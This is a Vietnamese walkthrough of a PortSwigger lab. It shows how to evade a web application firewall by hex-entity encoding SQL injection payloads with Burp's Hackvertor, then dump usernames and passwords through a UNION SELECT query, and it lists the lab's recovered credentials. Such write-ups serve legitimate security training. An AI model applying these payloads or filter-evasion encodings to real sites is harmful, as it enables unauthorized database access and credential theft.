- Đầu tiên,ta có thể xác định số cột của query trả về bằng câu truy vấn `UNION SELECT NULL` thì ta nhận được phản hồi lỗi 403 Forbidden

  ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/56ea5249-602e-40b7-8973-cdeb75fadf2a)

  Như vậy trang web đã phát hiện bị tấn công, ta hông thể tấn công theo cách bình thường như này, nên em cần phải sử dụng thêm extension có trong BurpSuite là Hackvertor, công cụ này sẽ biến đổi payload và mã hóa theo nhiều dạng khác nhau, tiêu biểu như: base64, base32, hex..,  Ở đây ta sẽ encode câu query theo dạng hex_entities để cố gắng vượt qua tường lửa của trang web
 ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/1057db9c-eb1e-49e8-a4e4-222e234e716a)

 ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/2714188d-cc54-4274-88f4-8eb7f982a532)

Ta thấy ở đây số cột được trả về là 1, từ đó ta sẽ tiến hành truy vấn username và password từ cột đó bằng câu lệnh

`UNION SELECT username||'#'||password from users`

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/c3ab5a2a-7fac-4753-a87c-524384d23669)

Ta tìm được các username và password lần lượt là: 
 + username: wiener password: irntf3qcpqgfxf4vedso
 + username: administrator password: fm6ib02c2ojdqdji6xff
 + username: carlos password: t4hjnu7a2qcdgncqfpf4

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/0ed23624-ceea-407d-aa49-4e5084dfd524)

Như vậy bài lab đã được giải quyết

  
